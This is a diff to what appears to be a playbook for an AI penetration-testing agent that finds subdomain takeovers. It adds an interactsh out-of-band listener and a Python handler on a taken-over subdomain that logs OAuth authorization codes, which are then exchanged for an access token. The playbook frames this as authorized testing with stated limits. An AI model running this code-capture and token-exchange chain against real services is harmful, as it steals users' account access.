@@ -38,7 +38,7 @@ This workflow uses only tools already present in the agent's runtime:
 - `execute_amass` for active brute / passive sweep when subfinder coverage is low.
 - `execute_httpx` for status / title / server / cert SAN / tech-detect probes across the resolved set.
 - `execute_nuclei` for the curated `takeovers/` template pack (140+ provider fingerprints).
-- `kali_shell` for `subzy` (90+ provider fingerprints, sharper than httpx -td banks), `dig`, `dnsx`, `dnsrecon`, `host`, `nslookup`, `whatweb`, `curl` (RDAP registration lookups via `https://rdap.org/domain/<name>`), `jq`, `interactsh-client` (verification listener), `ngrok` (expose your own claim from the sandbox), `python3 -m http.server` (serve PoC content).
+- `kali_shell` for `subzy` (90+ provider fingerprints, sharper than httpx -td banks), `dig`, `dnsx`, `dnsrecon`, `host`, `nslookup`, `whatweb`, `curl` (RDAP registration lookups via `https://rdap.org/domain/<name>`), `jq`, `interactsh-client` (verification listener - public, target-reachable OAST), `python3 -m http.server` (serve PoC content locally, or on your reverse port from the "Pre-Configured Payload Settings" block when a target must reach it - your tunnel is RedAmon-managed, do not start `ngrok`/`chisel` yourself).
 - `execute_code` for reading bulk JSON output, building CNAME chain graphs, looking up provider fingerprints, and orchestrating the claim/verify loop in one place.
 - `execute_curl` for raw HTTP/HTTPS probes against suspected dangling targets and for reading the resource at the alternate provider endpoint.
 
@@ -217,10 +217,10 @@ The goal of Phase 1 is to land in Phase 2 with a small, high-confidence list of 
 
    TLS clues are equally strong: a certificate whose CN/SAN belongs to the provider's default host (e.g. `*.amazonaws.com`, `*.azurewebsites.net`) instead of the subdomain itself usually means the provider is serving you a generic edge response, not the customer's resource.
 
-10. **Stand up the OOB verification listener** so Phase 2 verification can land instantly:
+10. **Stand up the OOB verification listener** so Phase 2 verification can land instantly: Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
    ```bash
-   interactsh-client -v -o /tmp/takeover-oast.log &
-   sleep 3 && grep -E "https?://[a-z0-9.-]+oast\." /tmp/takeover-oast.log | tail -1
+   interactsh-client -v -o /tmp/takeover-oast-RUN.log &
+   sleep 3 && grep -E "https?://[a-z0-9.-]+oast\." /tmp/takeover-oast-RUN.log | tail -1
    ```
    This callback URL is used in Phase 2 to confirm that DNS now resolves the taken-over subdomain to attacker-controlled infrastructure.
 
@@ -359,7 +359,16 @@ curl -sk "https://idp.target.tld/authorize?client_id=ABC&redirect_uri=https://vi
 ```
 If the IdP redirects without complaint, host a callback handler under the taken-over subdomain that logs the `code` parameter:
 ```python
-# execute_code (run on the sandbox; tunnel via ngrok if the bucket / Pages flow does not support custom logic)
+# execute_code. Prefer hosting the handler ON the taken-over infra (the claimed bucket /
+# Pages / storage endpoint) so the IdP's redirect reaches it directly. Only if that flow
+# cannot run custom logic, run it in the sandbox. Two DIFFERENT numbers from the
+# "Pre-Configured Payload Settings" block: the server LISTENS on your handler port
+# (LISTEN_PORT = the pool port, or 4444 when a tunnel is active, its ReverseListenerBindPort),
+# while the registered redirect_uri must resolve to the block's LHOST:LPORT (the public port
+# a tunnel forwards in; with ngrok the two differ). Your tunnel is RedAmon-managed - do NOT
+# start ngrok/chisel yourself, and never bind a sandbox service port (8000-8016, 4040).
+# This LISTEN_PORT is your reverse handler's: `ss -ltn` first. serve_forever holds it for ALL
+# your chats until execute_code's 120 s limit ends the script, so trigger the flow right away.
 import http.server, socketserver
 class H(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
@@ -367,7 +376,7 @@ class H(http.server.BaseHTTPRequestHandler):
             f.write(self.path + '\n')
         self.send_response(200); self.end_headers()
         self.wfile.write(b'ok')
-socketserver.TCPServer(('0.0.0.0', 8088), H).serve_forever()
+socketserver.TCPServer(('0.0.0.0', LISTEN_PORT), H).serve_forever()
 ```
 Trigger the flow as a user, fetch `/tmp/oauth_codes.log`, exchange the code for an access token, and stop. Do NOT enumerate the user's data once you hold a token; the report ships with a single redacted token and the redirect-uri configuration screenshot.
 
